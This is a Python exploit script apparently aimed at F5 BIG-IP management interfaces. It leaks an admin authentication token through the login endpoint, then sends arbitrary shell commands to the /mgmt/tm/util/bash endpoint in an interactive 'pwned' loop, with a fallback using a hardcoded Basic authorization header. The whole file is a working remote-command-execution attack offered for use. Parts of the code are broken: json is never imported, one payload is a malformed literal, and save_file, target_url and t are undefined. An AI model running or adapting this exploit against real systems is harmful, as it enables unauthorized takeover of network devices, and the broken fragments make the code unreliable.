import sys
import requests
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit(url, command):
    vuln_leak_token = url + '/mgmt/shared/authn/login'
    data_leak_token = {"bigipAuthCookie":"","username":"admin","loginReference":{"link":"/shared/gossip"},"userReference":{"link":"https://localhost/mgmt/shared/authz/users/admin"}}
    try_leak = requests.post(vuln_leak_token, headers={"User-Agent": "hello-world","Content-Type":"application/x-www-form-urlencoded"}, json=data_leak_token, verify=False, timeout=15)
    if try_leak.text.find("/mgmt/shared/authz/tokens/") == -1:
        print('[-] Trying again...')
        headers_poc2 = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
            'Content-Type': 'application/json',
            'X-F5-Auth-Token': '',
            'Authorization': 'Basic YWRtaW46QVNhc1M='
        }
        data = json.dumps({'"command": "run", "utilCmdArgs": "-c ' + command})
        check_url = url + '/mgmt/tm/util/bash'
        try:
            while True:
                r = requests.post(url=check_url, json=data, headers=headers_poc2, verify=False, timeout=20)
                if r.status_code == 200 and 'commandResult' in r.text:
                    default = json.loads(r.text)
                    display = default['commandResult']
                    save_file(target_url, t)
                    print('Vulnerable URL: {0}'.format(target_url))
                    print('pwded@~$ {0}'.format(display))
                else:
                    print('(-) Not vulnerable')
                    exit(0)
        except Exception as e:
            print(e)
    cmd = command
    print('pwned@~$ {0}'.format(cmd))
    while True:
        headers = {
        "Content-Type": "application/json",
        "X-F5-Auth-Token": "%s"%(try_leak.text.split('"selfLink":"https://localhost/mgmt/shared/authz/tokens/')[1].split('"}')[0])
        }
        data_json = {"command": "run", "utilCmdArgs": "-c \'%s\'"%(cmd)}
        vuln_rce = url + '/mgmt/tm/util/bash'
        rce_req = requests.post(vuln_rce, headers=headers, json=data_json, verify=False, timeout=15)
        if rce_req.status_code == 200 and 'commandResult' in rce_req.text:
            print(rce_req.text.split('commandResult":"')[1].split('"}')[0].replace('\\n', ''))
            cmd = input("pwned@~$ ")
        else:
            print('(-) Not vulnerable')
            exit(0)

def main():
    parser = argparse.ArgumentParser("python3 exploit.py")
    parser.add_argument('-u', '--url', type=str, help='url target')
    args = parser.parse_args()
    url = args.url

    try:
        exploit(url, "id")
    except KeyboardInterrupt:
        exit(0)
    except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout) as e:
        print(e)
        exit()

if __name__ == '__main__':
    main()